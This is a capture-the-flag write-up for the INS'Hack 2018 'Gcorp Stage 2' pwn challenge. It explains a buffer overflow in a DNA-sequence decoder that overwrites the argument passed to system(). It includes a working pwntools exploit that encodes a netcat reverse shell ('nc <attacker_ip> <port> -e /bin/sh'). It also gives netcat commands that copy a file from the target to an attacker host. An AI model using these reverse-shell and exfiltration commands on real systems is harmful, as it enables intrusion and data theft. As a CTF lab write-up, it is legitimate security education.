---
title: INS'Hack 2018 - Gcorp Stage 2
authors: qlemaire
layout: writeup
ctf_url: http://inshack.insecurity-insa.fr/
---
Solves: 44 / Points: 85 / Category: PWN

## Challenge description
> All you need to do is to pwn using some DNA samples...
>
> Once you gathered enough information, go checkout https://gcorp-stage-2.ctf.insecurity-insa.fr/
>
> Note: you should validate stage 1 to have more information on stage 2.

In stage 1, we were given a pcap file. From a TCP stream, it was possible to extract a 64bits ELF executable. We are told that this binary is running on a remote server. It is translating DNA sequences into bytes.

## Challenge resolution

### DNA encoding

Performing static and dynamic analysis of the binary, we can see how DNA decoding is performed. It is actually a base4 decoding with "A", "C", "G" and "T" characters.

Each blocks of 4 characters encode 1 byte. We have the following correspondance table
```
AAAA => 0x00
AAAC => 0x01
AAAG => 0x02
AAAT => 0x03
AACA => 0x04
AACC => 0x05
AACG => 0x06
AACT => 0x07
AAGA => 0x08 (8)
AAGC => 0x09
AAGG => 0x0a
AAGT => 0x0b
AATA => 0x0c
AATC => 0x0d
AATG => 0x0e
AATT => 0x0f
ACAA => 0x10 (16)
...
TTTT => 0xff (255)
```

### Overflow

User input is a DNA sequence of maximum 1024 bytes. After decoding, the output is 1024/4 = 256 bytes long. However, this output is stored within a 128 bytes char table. Therefore, it is possible to write 128 junk bytes, then overflow the table to override the `gcmd` variable which is given as parameter to the `system` command.

To exploit the remote system, we have to write 128 junk bytes, then write the command (64 characters maximum) we want to execute.

### Building an exploit

Here is a local exploit code (don't forget to launch your listener to get the reverse shell). We send 128 times "TTTT" (which is decoded with "\xff") and then our encoded reverse shell command.

```python
from pwn import *

p = process('./73494.elf')

OFFSET = 128
FF = "TTTT" # "TTTT" sequence is converted to "\xff"
IP = "<FIXME_ATTACKER_IP>"
CMD = "nc " + IP + " <FIMXE_ATTACKER_PORT> -e /bin/sh" # reverse shell
BASE_4 = ["A", "C", "G", "T"] # 0, 1, 2, 3

dna_list = list()

# converting command in DNA (yeah this code could be improved and refactored)
for char in CMD:
    dna = ""
    dec_value = ord(char)

    first_index = float(dec_value)/float(64.0)
    dna += BASE_4[int(first_index)] # 1st letter

    rest = dec_value-int(first_index)*64
    second_index = float(rest)/float(16.0)
    dna += BASE_4[int(second_index)] # 2nd letter

    rest -= int(second_index)*16
    third_index = float(rest)/float(4.0)
    dna += BASE_4[int(third_index)] # 3nd letter

    rest -= int(third_index)*4
    fourth_index = float(rest)/float(1.0)
    dna += BASE_4[int(fourth_index)] # 4th letter

    dna_list.append(dna)

info("Command is %s"%CMD)
info("DNA is %s"%"".join(dna_list)) 

# building payload
payload = FF*OFFSET # sending 128 "\xff" 
payload += "".join(dna_list) # sending command to execute
payload += "AAAA" # \x00

info("Full payload:\n%s"%payload)

# write payload to file
with open('payload.txt', 'w') as f:
    f.write(payload)

p.send(payload)
```

### Remote exploitation

For remote exploitation, we send the payload (stored within `payload.txt` after local exploitation) in the body of an HTTP POST request to https://gcorp-stage-2.ctf.insecurity-insa.fr/.

As soon as we get a shell on the target, we cat the flag stored within `.flag.txt` :
```bash
$ cat .flag.txt
INSA{1fb977db25976d7e1a0fb713383de1cea90b2d15b4173708d867be3793571ed9}
```

## Retrieve Gcorp Stage 3 file

From the remote target, we can retrieve the ZIP file for Gcorp Stage 3 `stage_3_storage.zip` via netcat:
```bash
(local_machine) $ nc -nvlp <attacker-port> > stage_3_storage.zip
(remote_machine) $ nc <attacker-ip> <attacker-port> < stage_3_storage.zip
```

_Of course, don't do that with sensitive customers files, there is no encryption here._